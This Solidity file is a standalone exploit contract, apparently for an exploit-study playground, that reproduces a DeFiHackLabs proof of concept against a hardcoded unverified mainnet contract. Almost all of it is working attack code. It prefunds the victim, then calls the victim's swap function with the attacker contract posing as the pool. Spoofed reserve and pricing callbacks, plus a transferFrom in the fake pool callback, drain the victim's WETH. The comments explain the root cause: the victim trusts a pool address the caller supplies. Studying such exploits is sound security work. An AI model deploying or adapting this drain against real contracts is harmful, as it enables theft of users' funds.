// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-04-UnverifiedContr_0x00C409).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (`ContractTest`) itself: `attacker = address(this)`, and the AMM-style callback
// stubs the victim calls back into (getBalance/getReserves/calcOutGivenIn/
// swapExactAmountIn/transfer + a payable fallback) live directly on the test
// contract. There is no standalone exploit contract to deploy, so this is a
// faithful, self-contained copy of that inline attack (attack() + the callback
// stubs), compiled inside the registry forge project. Logic and constants are
// copied verbatim from test/UnverifiedContr_0x00C409_exp.sol.
//
// Root cause: the unverified victim contract 0x00C409...003b exposes a
// Balancer-style swapExactAmountIn (selector 0xba381f8f) that takes a caller-
// supplied "pool" address and queries IT (not its own trusted storage) for
// getBalance/getReserves/calcOutGivenIn, then settles by wrapping its own ETH
// into WETH, approving that same caller-supplied "pool", and calling the
// "pool"'s swapExactAmountIn — which is really the attacker's transferFrom.
// No source is available for the victim (never verified on Etherscan); the
// vulnerability locator therefore anchors on this exploit contract instead.

interface IWETH {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function withdraw(uint256 wad) external;
}

contract UnverifiedContrDrain {
    IWETH constant weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address constant VULN_CONTRACT = 0x00C409001C1900DdCdA20000008E112417DB003b;

    event log_data(bytes data);

    // step 0: unwrap the WETH working capital (seeded via `setup.dealToken`),
    // send it to the victim as the "swap" input, then trigger the victim's
    // vulnerable swapExactAmountIn with this contract set as BOTH tokenIn/
    // tokenOut AND the untrusted "pool" callback target.
    function attack() public {
        weth.withdraw(4704.1 ether);
        (bool sentOk,) = VULN_CONTRACT.call{value: 4704.1 ether}("");
        require(sentOk, "prefund failed");

        bytes memory data = abi.encodeWithSelector(
            bytes4(0xba381f8f),
            0xffffffffffffffffff,
            0x01,
            address(this),
            address(this),
            0x00,
            0x00,
            0x00,
            address(this),
            0x01
        );
        emit log_data(data);
        (bool ok,) = VULN_CONTRACT.call(data);
        require(ok, "swap call failed");
    }

    // --- attacker-controlled "pool" callback stubs the victim queries -------

    function getBalance(address) public pure returns (uint256) {
        return 1; // spoofed reserve
    }

    function getReserves() public view returns (uint256, uint256, uint256) {
        return (1, 1, block.timestamp); // spoofed reserves
    }

    function calcOutGivenIn(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut,
        uint256 a,
        uint256 b,
        uint256 c
    ) public pure returns (uint256 amountOut) {
        return 1; // spoofed AMM math — makes the swap look nearly free
    }

    // The victim's own settlement calls back into THIS function (because the
    // victim was told the "pool" is this contract) with the WETH it just
    // minted for itself — this is the actual drain.
    function swapExactAmountIn(
        address tokenIn,
        uint256 tokenAmountIn,
        address tokenOut,
        uint256 minAmountOut,
        uint256 maxPrice
    ) external returns (uint256, uint256) {
        weth.transferFrom(msg.sender, address(this), tokenAmountIn);
        return (0, 0);
    }

    function transfer(address to, uint256 value) public returns (bool) {
        return true;
    }

    receive() external payable {}
    fallback() external payable {}
}
